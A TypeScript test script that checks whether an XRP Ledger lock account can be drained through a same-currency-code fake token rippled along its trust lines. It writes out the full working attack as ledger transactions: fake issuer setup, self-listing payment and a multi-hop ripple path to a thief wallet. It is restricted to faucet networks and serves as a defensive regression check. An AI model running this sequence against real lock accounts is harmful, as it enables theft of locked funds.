import { Client, Wallet, xrpToDrops, convertStringToHex } from 'xrpl'
import fs from 'node:fs'
import { genesisPath, network, xrplNetwork } from './testnet-lib'

/**
 * Whether a second issuer's token with the SAME currency code as a listed one
 * can be rippled through the lock account to drain the real token's backing.
 *
 * The attack: the attacker issues a worthless token under the same code (it
 * is the code and the issuer that identify a token, and anyone can mint a
 * code), lists it for the issuer fee, and the cluster opens a trust line from
 * the lock account to it. If the lock account's side of both lines allows
 * rippling, the attacker pays itself the real token THROUGH the lock account:
 * the lock ends up holding the worthless copy and the real token is gone.
 * Setting NoRipple on the lock account's side of every line stops it.
 *
 * Faucet money only (Devnet or Testnet); the seeds are made in memory and
 * never printed or written.
 *
 *   npx tsx scripts/ripple-check.ts [--expect safe|vulnerable]
 *   TARGET=PETAL     which listed token to attack (default: the first listed IOU the lock holds)
 *
 * --expect safe (the default) exits 1 if the payment goes through;
 * --expect vulnerable exits 1 if it does not (use it to prove the hole on a
 * cluster that has not been fixed yet).
 */
const POLL_MS = 5000
const LISTING_WAIT_MS = 10 * 60 * 1000

const expect = process.argv.includes('--expect') ? process.argv[process.argv.indexOf('--expect') + 1] : 'safe'
const failures: string[] = []
const check = (ok: boolean, what: string) => {
  console.log(`${ok ? 'ok  ' : 'FAIL'} ${what}`)
  if (!ok) failures.push(what)
}
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms))

async function send(client: Client, w: Wallet, tx: Record<string, unknown>, label: string): Promise<string> {
  const prepared = await client.autofill({ ...tx, Account: w.classicAddress } as any)
  const res = await client.submitAndWait(w.sign(prepared).tx_blob)
  const result = (res.result.meta as { TransactionResult?: string }).TransactionResult ?? 'unknown'
  console.log(`  ${label}: ${result}`)
  return result
}

async function lines(client: Client, account: string) {
  const r = await client.request({ command: 'account_lines', account, ledger_index: 'validated' })
  return r.result.lines as { account: string; currency: string; balance: string; no_ripple?: boolean }[]
}

async function main() {
  if (!network().faucet) throw new Error(`${xrplNetwork()} has no faucet: this check makes accounts and must never run against real money`)
  const genesis = JSON.parse(fs.readFileSync(genesisPath(), 'utf8'))
  const lock: string = genesis.config.xrpl.lockAccount
  const funding: string = genesis.config.xrpl.fundingAccount
  const listingFee: string = genesis.config.params.issuerListingFeeXrp ?? '50'
  const client = new Client(network().ws)
  await client.connect()
  try {
    // The real token to attack: a listed IOU the lock account actually holds.
    const held = (await lines(client, lock)).filter((l) => Number(l.balance) > 0)
    const target = process.env.TARGET ? genesis.tokens[process.env.TARGET] : Object.values<any>(genesis.tokens).find((t) => t.currency && held.some((l) => l.currency === t.currency))
    if (!target?.currency) throw new Error('no listed IOU the lock account holds: lock some first (scripts/testnet-actions.ts lock)')
    const real = held.find((l) => l.currency === target.currency)
    if (!real) throw new Error(`the lock account holds no ${target.sym}`)
    const currency: string = target.currency
    const realIssuer: string = real.account
    console.log(`target ${target.sym} (${currency}) real issuer ${realIssuer}, lock holds ${real.balance}`)

    const fund = async (label: string) => {
      const { wallet } = await client.fundWallet()
      console.log(`  ${label}: ${wallet.classicAddress}`)
      return wallet
    }
    const fake = await fund('fake issuer')
    const holder = await fund('holder of the fake token')
    const thief = await fund('thief (receives the real token)')

    // The fake issuer looks like any issuer the cluster accepts: DefaultRipple on, nothing else special.
    await send(client, fake, { TransactionType: 'AccountSet', SetFlag: 8 }, 'fake issuer DefaultRipple')
    await send(client, holder, { TransactionType: 'TrustSet', LimitAmount: { currency, issuer: fake.classicAddress, value: '1000000' } }, 'holder trusts the fake issuer')
    await send(client, fake, { TransactionType: 'Payment', Destination: holder.classicAddress, Amount: { currency, issuer: fake.classicAddress, value: '5' } }, 'fake issuer pays the holder 5 fake')
    await send(client, thief, { TransactionType: 'TrustSet', LimitAmount: { currency, issuer: realIssuer, value: '1000000' } }, 'thief trusts the real issuer')

    // List the fake the way any issuer lists its own token: the issuer lane, one payment from the issuer.
    const memo = JSON.stringify({ c: currency, i: fake.classicAddress, n: 'Ripple check fake' })
    await send(
      client,
      fake,
      { TransactionType: 'Payment', Destination: funding, Amount: xrpToDrops(listingFee), Memos: [{ Memo: { MemoData: convertStringToHex(`propose:${memo}`) } }] },
      `fake issuer lists itself (${listingFee} XRP)`,
    )

    console.log('waiting for the cluster to open the lock account\'s line to the fake issuer...')
    const deadline = Date.now() + LISTING_WAIT_MS
    let fakeLine: { no_ripple?: boolean } | undefined
    while (Date.now() < deadline) {
      fakeLine = (await lines(client, lock)).find((l) => l.account === fake.classicAddress && l.currency === currency)
      if (fakeLine) break
      await sleep(POLL_MS)
    }
    check(!!fakeLine, 'the cluster opened a line from the lock account to the fake issuer')
    if (!fakeLine) throw new Error('the fake token was never listed: is the cluster running and reading this ledger?')
    const realLine = (await lines(client, lock)).find((l) => l.account === realIssuer && l.currency === currency)
    console.log(`  lock side NoRipple: fake line ${fakeLine.no_ripple ?? false}, real line ${realLine?.no_ripple ?? false}`)

    const before = Number((await lines(client, lock)).find((l) => l.account === realIssuer && l.currency === currency)?.balance ?? 0)
    // The ripple: holder -> fake issuer -> LOCK -> real issuer -> thief, same currency code all the way.
    const paid = await send(
      client,
      holder,
      {
        TransactionType: 'Payment',
        Destination: thief.classicAddress,
        Amount: { currency, issuer: thief.classicAddress, value: '2' },
        SendMax: { currency, issuer: holder.classicAddress, value: '3' },
        Paths: [[{ account: fake.classicAddress }, { account: lock }, { account: realIssuer }]],
      },
      'ripple 2 through the lock account',
    ).catch((e) => `error: ${(e as Error).message}`)
    const after = Number((await lines(client, lock)).find((l) => l.account === realIssuer && l.currency === currency)?.balance ?? 0)
    const stolen = before - after
    console.log(`  lock's real ${target.sym}: ${before} -> ${after}`)

    if (expect === 'vulnerable') {
      check(paid === 'tesSUCCESS' && stolen > 0, `VULNERABLE as expected: the lock account lost ${stolen} real ${target.sym} to a worthless copy`)
    } else {
      check(paid !== 'tesSUCCESS' && stolen === 0, `safe: the ripple was refused (${paid}) and the lock account kept its ${target.sym}`)
    }
  } finally {
    await client.disconnect()
  }
  if (failures.length) {
    console.log(`\n${failures.length} check(s) failed`)
    process.exit(1)
  }
  console.log('\nall checks passed')
}

main().catch((e) => {
  console.error('ERROR', e?.message ?? e)
  process.exit(1)
})
